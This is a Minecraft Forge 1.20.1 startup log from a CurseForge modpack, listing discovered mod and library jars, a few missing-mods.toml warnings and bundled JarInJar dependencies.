id,title,username,language,date,content
[01:23:37] [main/INFO]: Found mod file Steam_Rails-1.6.6+forge-mc1.20.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file storagedrawers-1.20.1-12.0.3.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file structureessentials-1.20.1-3.3.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file structurize-1.20.1-1.0.759-snapshot.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file stylecolonies-1.12-1.20.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file supermartijn642configlib-1.1.8-forge-mc1.20.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file supermartijn642corelib-1.1.17-forge-mc1.20.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file tectonic-forge-1.19.3-2.3.4.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file TerraBlender-forge-1.20.1-3.0.1.4.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file Terralith_1.20.4_v2.4.11.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file tfmg-0.9.3-1.20.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file torchmaster-20.1.8.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file tournament-1.20.1-forge-1.1.0_beta-5.3+af35b3821f.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file towntalk-1.20.1-1.0.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file trackwork-1.20.1-1.1.1b.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file trashcans-1.0.18b-forge-mc1.20.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file travelersbackpack-forge-1.20.1-9.1.16.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file valkyrienskies-120-2.3.0-beta.5.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file waystones-forge-1.20-14.1.5.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file worldedit-mod-7.2.15.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file XaeroPlus-2.26.5+forge-1.20.1-WM1.39.4-MM25.2.0.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file Xaeros_Minimap_25.2.0_Forge_1.20.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file XaerosWorldMap_1.39.4_Forge_1.20.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/WARN]: Mod file E:\Curseforge\Install\libraries\net\minecraftforge\fmlcore\1.20.1-47.4.4\fmlcore-1.20.1-47.4.4.jar is missing mods.toml file
[01:23:37] [main/WARN]: Mod file E:\Curseforge\Install\libraries\net\minecraftforge\javafmllanguage\1.20.1-47.4.4\javafmllanguage-1.20.1-47.4.4.jar is missing mods.toml file
[01:23:37] [main/WARN]: Mod file E:\Curseforge\Install\libraries\net\minecraftforge\lowcodelanguage\1.20.1-47.4.4\lowcodelanguage-1.20.1-47.4.4.jar is missing mods.toml file
[01:23:37] [main/WARN]: Mod file E:\Curseforge\Install\libraries\net\minecraftforge\mclanguage\1.20.1-47.4.4\mclanguage-1.20.1-47.4.4.jar is missing mods.toml file
[01:23:37] [main/INFO]: Found mod file fmlcore-1.20.1-47.4.4.jar of type LIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.MinecraftLocator@ce9b9a9
[01:23:37] [main/INFO]: Found mod file javafmllanguage-1.20.1-47.4.4.jar of type LANGPROVIDER with provider net.minecraftforge.fml.loading.moddiscovery.MinecraftLocator@ce9b9a9
[01:23:37] [main/INFO]: Found mod file lowcodelanguage-1.20.1-47.4.4.jar of type LANGPROVIDER with provider net.minecraftforge.fml.loading.moddiscovery.MinecraftLocator@ce9b9a9
[01:23:37] [main/INFO]: Found mod file mclanguage-1.20.1-47.4.4.jar of type LANGPROVIDER with provider net.minecraftforge.fml.loading.moddiscovery.MinecraftLocator@ce9b9a9
[01:23:37] [main/INFO]: Found mod file client-1.20.1-20230612.114412-srg.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.MinecraftLocator@ce9b9a9
[01:23:37] [main/INFO]: Found mod file forge-1.20.1-47.4.4-universal.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.MinecraftLocator@ce9b9a9
[01:23:38] [main/WARN]: Attempted to select two dependency jars from JarJar which have the same identification: Mod File:  and Mod File: . Using Mod File: 
[01:23:38] [main/WARN]: Attempted to select a dependency jar for JarJar which was passed in as source: cloth_config. Using Mod File: E:\Curseforge\Instances\Create'a Colony (1)\mods\cloth-config-11.1.118-forge.jar
[01:23:38] [main/INFO]: Found 90 dependencies adding them to mods collection
[01:23:38] [main/INFO]: Found mod file fabric-transfer-api-v1-3.3.5+631c9cd677.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-dimensions-v1-2.1.54+8005d10d77.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file kuma-api-forge-20.1.10+1.20.1.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-renderer-api-v1-3.2.1+cf68abbe77.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file joml-primitives-1.10.0.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file jackson-module-parameter-names-2.14.0.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file kfflang-4.11.0.jar of type LANGPROVIDER with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-item-api-v1-2.1.28+4d0bbcfa77.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-model-loading-api-v1-1.0.3+6274ab9d77.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file zjsonpatch-0.4.11.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-rendering-fluids-v1-3.0.28+4ac5e37a77.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file util-1.1.0+b19b27c4a4.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-screen-handler-api-v1-1.3.30+561530ec77.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file jackson-annotations-2.14.0.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-models-v0-0.4.2+7c3892a477.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file jackson-module-kotlin-2.14.0-rubyfork.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-resource-loader-v0-0.11.10+bcd08ed377.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file mclib-20.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-rendering-v1-3.0.8+66e9a48f77.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-renderer-indigo-1.5.2+b5b2da4177.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-convention-tags-v1-1.5.5+fa3d1c0177.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file ritchiesprojectilelib-2.0.0-dev+mc.1.20.1-forge-build.182.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-mining-level-api-v1-2.1.50+561530ec77.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-command-api-v1-1.2.34+f71b366f77.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file commons-collections4-4.3.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-block-view-api-v2-1.0.1+0767707077.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file MixinExtras-0.4.1.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-command-api-v2-2.2.13+561530ec77.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file MixinSquared-0.1.1.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-data-attachment-api-v1-1.0.0+30ef839e77.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file crackerslib-forge-1.20.1-0.4.4.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file mixinextras-forge-0.2.0.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file jankson-1.2.3.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file create_dragon_lib-1.20.1-1.4.3.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file jsonschema-module-jackson-4.25.0.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file itu-1.7.0.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-screen-api-v1-2.0.8+45a670a577.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-particles-v1-1.1.2+78e1ecb877.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file puzzlesaccessapi-forge-8.0.7.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file dagger-2.43.2.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file OldBiomes-1.0.0.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-content-registries-v0-4.0.11+a670df1e77.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-transitive-access-wideners-v1-4.3.1+1880499877.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file caffeine-3.2.0.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-game-rule-api-v1-1.0.40+683d4da877.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file classmate-1.5.1.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-api-base-0.4.31+ef105b4977.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file runtime-1.0.0+1.20.1.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-api-lookup-api-v1-1.6.36+67f9824077.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-blockrenderlayer-v1-1.1.41+1d0da21e77.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file json-schema-validator-1.0.71.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file mixinsquared-forge-0.1.1.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file LambdaEvents-2.4.2.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file Registrate-MC1.20-1.3.3.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file jackson-core-2.14.0.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file jackson-kotlin-dsl-1.2.0.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file api-1.1.0+b19b27c4a4.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file jackson-dataformat-cbor-2.14.0.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file spectrelib-forge-0.13.15+1.20.1.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-block-api-v1-1.0.11+0e6cb7f777.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file javax.inject-1.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
